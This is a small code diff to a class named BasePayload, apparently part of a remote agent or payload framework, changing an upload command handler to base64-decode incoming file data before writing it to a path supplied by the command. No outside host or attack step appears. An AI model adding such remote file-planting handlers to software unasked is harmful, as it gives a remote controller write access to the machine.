@@ -29,7 +29,7 @@ class BasePayload(object):
 		elif cmd['type'] == 'ul':
 			try:
 				with open(cmd['fn'],'wb') as f:
-					f.write(cmd['fd'])
+					f.write(utils.b64d(cmd['fd']))
 				r = True
 			except Exception as e:
 				r = e
